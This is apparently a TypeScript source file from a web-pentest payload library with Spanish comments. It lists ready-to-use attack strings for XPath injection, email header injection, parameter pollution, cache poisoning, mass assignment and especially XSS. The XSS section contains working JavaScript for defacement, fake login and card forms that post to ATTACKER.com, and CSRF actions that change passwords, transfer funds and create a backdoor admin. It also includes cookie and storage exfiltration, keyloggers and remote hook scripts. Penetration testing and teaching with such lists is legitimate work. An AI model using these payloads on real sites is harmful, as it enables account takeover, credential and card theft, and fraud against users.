    // Extracción via string-length()
    `' and string-length(//user[1]/username)>3 and '1'='1`,
    // Acceso a nodos arbitrarios
    `'] | //user/* | //foo['`,
    `']/parent::*/child::* | //foo['`,
    // doc() para LFI via XPath
    `' and doc('file:///etc/passwd') and '1'='1`,
    `' or doc('http://ATTACKER.com/ssrf') or '1'='1`,
    // Leer todos los valores
    `' or 1=1]/parent::*/descendant::text() | //a['`,
  ],
}

export const emailHeaderInjection: PayloadCategory = {
  title: "Email Header Injection",
  description: "Inyección de cabeceras SMTP para spam relay, CC/BCC arbitrario y phishing via campos de formulario",
  tag: "Email Injection",
  tagColor: "bg-pink-500/10 text-pink-400 border-pink-500/20",
  payloads: [
    // CC injection en campo From/To
    `victim@target.com%0aCc:attacker@evil.com`,
    `victim@target.com%0d%0aCc:attacker@evil.com`,
    `victim@target.com\r\nCc:attacker@evil.com`,
    `victim@target.com\nCc:attacker@evil.com`,
    // BCC injection
    `victim@target.com%0aBcc:attacker@evil.com`,
    `victim@target.com%0d%0aBcc:attacker@evil.com`,
    // Multiple recipients
    `victim@target.com%0aTo:spam1@evil.com%0aTo:spam2@evil.com`,
    // Subject injection
    `victim@target.com%0aSubject:Phishing Subject Here`,
    // Body injection
    `victim@target.com%0a%0aInjected email body here`,
    // From injection
    `%0aFrom:spoofed@evil.com`,
    `%0d%0aFrom:spoofed@evil.com`,
    // MIME injection
    `victim@target.com%0aContent-Type:text/html%0a%0a<h1>Phishing</h1>`,
    // Reply-To poisoning
    `victim@target.com%0aReply-To:attacker@evil.com`,
    // Relay spam via injection
    `nobody@example.com%0aTo:victim@target.com%0aFrom:spoofed@bank.com%0aSubject:Account Alert%0a%0aClick here...`,
    // En campo "name" del formulario de contacto
    `John Doe\r\nBcc:attacker@evil.com`,
    `John Doe\nCc:spam@evil.com`,
    // SMTP command injection
    `test@test.com\r\nRCPT TO:<attacker@evil.com>`,
    `test@test.com%0d%0aDATA%0d%0aFrom: spoofed@bank.com%0d%0a.`,
  ],
}

export const httpParameterPollution: PayloadCategory = {
  title: "HTTP Parameter Pollution (HPP)",
  description: "Duplicar parámetros para confundir WAF/backend, bypass de validaciones y manipulación de lógica",
  tag: "HPP",
  tagColor: "bg-orange-500/10 text-orange-400 border-orange-500/20",
  payloads: [
    // Duplicar param — diferente interpretación por servidor
    `id=1&id=2`,
    `id=1&id=1&id=1`,
    `id=legitimate&id=malicious`,
    `role=user&role=admin`,
    `admin=false&admin=true`,
    `action=view&action=delete`,
    // Array notation
    `id[]=1&id[]=2`,
    `user[role]=admin`,
    `user[admin]=1`,
    `param[0]=val1&param[1]=val2`,
    // Separator bypass
    `id=1;id=2`,
    `id=1%26id=2`,
    `id=1%3bid=2`,
    // HPP en rutas
    `/api/user?id=1&id=99`,
    `/search?q=safe&q=<script>alert(1)</script>`,
    // WAF bypass via HPP (el WAF analiza el primero, backend usa el segundo)
    `search=legitimate&search=' OR 1=1--`,
    `token=VALID_TOKEN&token=FORGED_TOKEN`,
    `amount=100&amount=1`,
    `redirect=https://target.com&redirect=https://evil.com`,
    // HPP en headers (algunos frameworks)
    `X-Forwarded-For: 127.0.0.1, X-Forwarded-For: attacker_ip`,
    // Encoded duplicates
    `id=1&%69%64=2`,
    `id=1&Id=2&iD=99`,
    // OAuth HPP
    `client_id=REAL&client_id=ATTACKER&redirect_uri=https://target.com/callback`,
    // JSON HPP
    `{"id":1,"id":99}`,
    `{"role":"user","role":"admin"}`,
  ],
}

export const cachePoisoning: PayloadCategory = {
  title: "Web Cache Poisoning",
  description: "Envenenamiento de caché via headers no cacheados, fat GET, param cloaking y cache deception",
  tag: "Cache Poisoning",
  tagColor: "bg-indigo-500/10 text-indigo-400 border-indigo-500/20",
  payloads: [
    // Headers unkeyed clásicos — probar en cada request
    `X-Forwarded-Host: ATTACKER.com`,
    `X-Forwarded-Scheme: http`,
    `X-Forwarded-Proto: http`,
    `X-Host: ATTACKER.com`,
    `X-Original-URL: /admin`,
    `X-Rewrite-URL: /admin`,
    `X-Forwarded-Port: 1337`,
    `X-Forwarded-For: 127.0.0.1`,
    `X-Real-IP: 127.0.0.1`,
    `X-Custom-IP-Authorization: 127.0.0.1`,
    `X-Original-Host: ATTACKER.com`,
    `Forwarded: host=ATTACKER.com`,
    // Cache buster — agregar param random para no romper caché real
    `/?cb=1234  (cache buster para testing)`,
    // Fat GET — body en request GET
    `GET /?param=cached HTTP/1.1\r\nHost: target.com\r\nContent-Length: 30\r\n\r\nparam=poisoned&other=ignored`,
    // Param cloaking (separadores alternativos)
    `GET /?keyed_param=1;unkeyed_param=poisoned`,
    `GET /?keyed_param=1&_unkeyed=poisoned`,
    // Cache deception — forzar caché de página dinámica
    `/account/settings/nonexistent.css`,
    `/account/settings/static.jpg`,
    `/profile/../../../account/settings`,
    // Header injection en respuesta cacheada
    `X-Forwarded-Host: attacker.com"><script>alert(1)</script>`,
    // Vary header bypass
    `Accept-Language: en-US,en;q=0.5  (si Vary: Accept-Language pero no se normaliza)`,
    `Accept-Encoding: gzip, gzip  (header duplicado)`,
    // CDN-specific
    `Pragma: akamai-x-cache-on`,
    `Pragma: akamai-x-get-cache-key`,
    `X-Cache-Key: /poisoned`,
  ],
}

export const sqlTruncation: PayloadCategory = {
  title: "SQL Truncation & Mass Assignment",
  description: "Bypass de límites de longitud en BD, creación de usuarios duplicados y asignación masiva en APIs REST",
  tag: "SQL Truncation",
  tagColor: "bg-red-500/10 text-red-400 border-red-500/20",
  payloads: [
    // SQL Truncation — registro con username truncado
    `admin                                                  x`,
    `admin@target.com                                       x@y.com`,
    // Concepto: MySQL trunca VARCHAR(20) → "admin" + spaces == "admin"
    `Username: "admin   " + 100 spaces + "attacker"  →  truncado a "admin"`,
    `Email: "admin@target.com   " + spaces  →  truncado, choca con admin existente`,
    // Password reset via truncation
    `Registrar: "admin@target.com  " (con espacios)  →  resetear contraseña del admin real`,
    // Mass Assignment — campos extra en JSON/form
    `{"username":"user","password":"pass","role":"admin"}`,
    `{"username":"user","password":"pass","isAdmin":true}`,
    `{"username":"user","password":"pass","admin":1}`,
    `{"username":"user","password":"pass","verified":true}`,
    `{"username":"user","password":"pass","credits":99999}`,
    `{"username":"user","password":"pass","plan":"enterprise"}`,
    `{"username":"user","password":"pass","balance":10000}`,
    // Rails mass assignment via query params
    `POST /users?user[role]=admin`,
    `POST /users?user[admin]=true`,
    `POST /profile?user[is_admin]=1`,
    // Node.js / Express mass assignment
    `{"__proto__":{"admin":true},"username":"user","password":"pass"}`,
    // Django mass assignment
    `{"username":"user","password":"pass","is_staff":true,"is_superuser":true}`,
    // Bypass email verification
    `{"email":"attacker@evil.com","email_verified":true}`,
    `{"email":"attacker@evil.com","confirmed":true}`,
    // Laravel fillable bypass
    `{"name":"user","password":"pass","role_id":1}`,
  ],
}

export const xssExploit: PayloadCategory = {
  title: "XSS Exploit — DOM / Defacement / Actions",
  description: "Payloads de explotación real: defacement, UI injection, redirección, CSRF via XSS, exfiltración, keylogging, control de flujo y persistencia (Stored XSS)",
  tag: "XSS Exploit",
  tagColor: "bg-red-500/10 text-red-400 border-red-500/20",
  payloads: [
    // ── 1. DOM Manipulation / Defacement ──────────────────────────────────────
    "/* 🧱 1. DOM / DEFACEMENT — cambiar lo que el usuario ve */",
    "document.body.innerHTML='<h1 style=\"color:red;text-align:center;margin-top:20vh;font-size:4rem\">Hacked</h1>'",
    "document.body.innerHTML='<h1>Hacked by XSS</h1><p>Your site has been compromised.</p>'",
    "document.title='HACKED'",
    "document.querySelector('h1').innerText='HACKED'",
    "document.querySelectorAll('p,h1,h2,h3,span,a').forEach(e=>e.innerText='HACKED')",
    "document.body.style.cssText='background:#000!important;color:red!important;filter:invert(1)'",
    "document.body.style.background='url(https://ATTACKER.com/defaced.jpg) no-repeat center/cover'",
    "document.getElementById('content').remove()",
    "document.querySelectorAll('img').forEach(i=>i.src='https://ATTACKER.com/hacked.png')",
    "document.querySelectorAll('a').forEach(a=>a.href='https://ATTACKER.com')",
    "<script>document.body.outerHTML='<body style=background:red><h1>Defaced</h1></body>'</script>",

    // ── 2. UI Injection / Phishing in-site ───────────────────────────────────
    "/* 🧩 2. UI INJECTION — agregar contenido falso a la página */",
    "var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99999;display:flex;align-items:center;justify-content:center';d.innerHTML='<div style=\"text-align:center\"><h2>Session expired</h2><form action=\"https://ATTACKER.com/steal\" method=\"POST\"><input name=\"user\" placeholder=\"Username\" style=\"display:block;margin:8px auto;padding:8px;width:250px\"><input type=\"password\" name=\"pass\" placeholder=\"Password\" style=\"display:block;margin:8px auto;padding:8px;width:250px\"><button style=\"padding:10px 30px;background:#0066cc;color:#fff;border:0;cursor:pointer\">Sign In</button></form></div>';document.body.appendChild(d)",
    "var b=document.createElement('button');b.innerText='Verify Account';b.style.cssText='position:fixed;bottom:20px;right:20px;z-index:9999;background:red;color:#fff;padding:12px 20px;border:0;border-radius:6px;cursor:pointer;font-size:16px';b.onclick=()=>location.href='https://ATTACKER.com/phish';document.body.appendChild(b)",
    "var m=document.createElement('div');m.style.cssText='position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#d32f2f;color:#fff;padding:14px 28px;border-radius:8px;z-index:99999;font-size:15px';m.innerText='⚠️ Your account has been flagged. Click here to verify.';m.onclick=()=>location.href='https://ATTACKER.com';document.body.appendChild(m)",
    "var f=document.createElement('form');f.action='https://ATTACKER.com/steal';f.method='POST';f.innerHTML='<input name=\"cc\" placeholder=\"Card number\"><input name=\"exp\" placeholder=\"MM/YY\"><input name=\"cvv\" placeholder=\"CVV\"><button>Pay Now</button>';document.querySelector('form')?.replaceWith(f)",

    // ── 3. Redirección ───────────────────────────────────────────────────────
    "/* 🔁 3. REDIRECCIÓN — mover al usuario a otra página */",
    "window.location='https://ATTACKER.com'",
    "window.location.href='https://ATTACKER.com/fake-login'",
    "location.replace('https://ATTACKER.com')",
    "window.location.assign('https://ATTACKER.com')",
    "setTimeout(()=>location.href='https://ATTACKER.com',3000)",
    "window.open('https://ATTACKER.com','_blank')",
    "history.pushState({},'','https://ATTACKER.com')",
    "document.location='javascript:window.location=\"https://ATTACKER.com\"'",

    // ── 4. Acciones como el usuario (CSRF via XSS) ────────────────────────────
    "/* ⚙️ 4. ACCIONES COMO USUARIO — CSRF via XSS */",
    "fetch('/api/change-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({newPassword:'hacked123'}),credentials:'include'})",
    "fetch('/api/change-email',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:'attacker@evil.com'}),credentials:'include'})",
    "fetch('/account/delete',{method:'POST',credentials:'include'})",
    "fetch('/api/transfer',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({to:'attacker',amount:9999}),credentials:'include'})",
    "var f=document.createElement('form');f.method='POST';f.action='/admin/create-user';f.innerHTML='<input name=\"username\" value=\"backdoor\"><input name=\"password\" value=\"P@ssw0rd\"><input name=\"role\" value=\"admin\">';document.body.appendChild(f);f.submit()",
    "fetch('/api/user/settings',{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify({2fa_enabled:false}),credentials:'include'})",
    "document.forms[0].action='https://ATTACKER.com/steal';document.forms[0].submit()",

    // ── 5. Exfiltración / Requests externos ───────────────────────────────────
    "/* 📡 5. EXFILTRACIÓN — enviar datos hacia afuera */",
    "fetch('https://ATTACKER.com/?c='+document.cookie)",
    "new Image().src='https://ATTACKER.com/?c='+encodeURIComponent(document.cookie)",
    "navigator.sendBeacon('https://ATTACKER.com/collect',document.cookie)",
    "fetch('https://ATTACKER.com/?ls='+btoa(JSON.stringify({...localStorage})))",
    "fetch('https://ATTACKER.com/?ss='+btoa(JSON.stringify({...sessionStorage})))",
    "fetch('https://ATTACKER.com/?dom='+btoa(document.body.innerHTML.substring(0,2000)))",
    "fetch('https://ATTACKER.com/?url='+encodeURIComponent(location.href)+'&ref='+encodeURIComponent(document.referrer))",
    "fetch('https://ATTACKER.com/?ua='+encodeURIComponent(navigator.userAgent)+'&lang='+navigator.language)",
    "fetch('/api/userinfo',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://ATTACKER.com/?d='+btoa(JSON.stringify(d))))",
    "var x=new XMLHttpRequest();x.open('GET','https://ATTACKER.com/?c='+document.cookie);x.send()",
    "document.write('<img src=\"https://ATTACKER.com/?c='+document.cookie+'\">')",

    // ── 6. Keylogging ─────────────────────────────────────────────────────────
    "/* ⌨️ 6. KEYLOGGING — capturar lo que escribe el usuario */",
    "document.addEventListener('keypress',e=>fetch('https://ATTACKER.com/?k='+encodeURIComponent(e.key)))",
    "var buf='';document.addEventListener('keydown',e=>{buf+=e.key;if(buf.length>20){fetch('https://ATTACKER.com/?keys='+encodeURIComponent(buf));buf=''}})",
    "document.querySelectorAll('input,textarea').forEach(i=>i.addEventListener('input',e=>fetch('https://ATTACKER.com/?f='+encodeURIComponent(e.target.name||e.target.id)+'&v='+encodeURIComponent(e.target.value))))",
    "document.querySelectorAll('input[type=password]').forEach(i=>i.addEventListener('change',e=>fetch('https://ATTACKER.com/?pass='+encodeURIComponent(e.target.value))))",
    "document.addEventListener('paste',e=>fetch('https://ATTACKER.com/?paste='+encodeURIComponent((e.clipboardData||window.clipboardData).getData('text'))))",
    "var orig=HTMLFormElement.prototype.submit;HTMLFormElement.prototype.submit=function(){fetch('https://ATTACKER.com/?form='+encodeURIComponent(new URLSearchParams(new FormData(this)).toString()));orig.call(this)}",

    // ── 7. Control del flujo ──────────────────────────────────────────────────
    "/* 🧠 7. CONTROL DE FLUJO — manipular comportamiento del sitio */",
    "document.querySelectorAll('button,input[type=submit],a').forEach(b=>b.disabled=true)",
    "window.onbeforeunload=()=>''",
    "setInterval(()=>document.querySelectorAll('button').forEach(b=>b.disabled=true),100)",
    "var orig=window.fetch;window.fetch=function(u,o){fetch('https://ATTACKER.com/?intercept='+encodeURIComponent(u));return orig.apply(this,arguments)}",
    "var origXHR=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){fetch('https://ATTACKER.com/?xhr='+encodeURIComponent(u));return origXHR.apply(this,arguments)}",
    "history.pushState=function(){};history.replaceState=function(){}",
    "window.confirm=()=>true;window.alert=()=>{}",
    "document.querySelectorAll('a[href]').forEach(a=>a.addEventListener('click',e=>{e.preventDefault();fetch('https://ATTACKER.com/?click='+a.href)}))",
    "Object.defineProperty(document,'cookie',{get:()=>'',set:v=>fetch('https://ATTACKER.com/?setCookie='+encodeURIComponent(v))})",

    // ── 8. Persistencia (Stored XSS) ─────────────────────────────────────────
    "/* 🧬 8. PERSISTENCIA — stored XSS que se ejecuta para todos */",
    "localStorage.setItem('__xss','<img src=x onerror=eval(atob(\"'+btoa('fetch(\"https://ATTACKER.com/?c=\"+document.cookie)')+'\"))>')",
    "document.cookie='__session=<img src=x onerror=alert(1)>;path=/;SameSite=None'",
    "var s=document.createElement('script');s.src='https://ATTACKER.com/hook.js';document.head.appendChild(s)",
    "if(!window.__hooked){window.__hooked=1;var s=document.createElement('script');s.src='https://ATTACKER.com/persistent.js';document.head.appendChild(s)}",
    "navigator.serviceWorker.register('/sw.js').catch(()=>{})",
    "caches.open('xss').then(c=>c.add('/critical-page'))",
    "indexedDB.open('xss').onsuccess=e=>e.target.result.transaction(['store'],'readwrite').objectStore('store').put({payload:'<script>alert(1)<\\/script>'},'key')",
    "/* BeEF hook (usar con BeEF framework): */ var s=document.createElement('script');s.src='http://ATTACKER.com:3000/hook.js';document.head.appendChild(s)",
  ],
}

export const allPayloadCategories: PayloadCategory[] = [
  sqliClassic,
  sqliUnionBased,
  sqliErrorBased,
  sqliBlindBoolean,
  sqliTimeBased,
  sqliObfuscated,
  sqliOOB,
  nosqlInjection,
  xssClassic,
  xssFilterBypass,
  xssObfuscated,
  xssDOM,
  xssPolyglot,
  xssCSPBypass,
  cmdInjection,
  cmdInjectionObfuscated,
  sstiPayloads,
  pathTraversal,
  xxePayloads,
  ssrfPayloads,
  openRedirect,
  crlfInjection,
  httpSmuggling,
  log4shell,
  graphqlAttacks,
  prototypePollution,
  hostHeaderInjection,
  jwtAttacks,
  fileUploadBypass,
  deserialization,
  corsAttacks,
  oauthAttacks,
  websocketAttacks,
  raceConditions,
  ldapInjection,
  xpathInjection,
  emailHeaderInjection,
  httpParameterPollution,
  cachePoisoning,
  sqlTruncation,
  xssExploit,
]
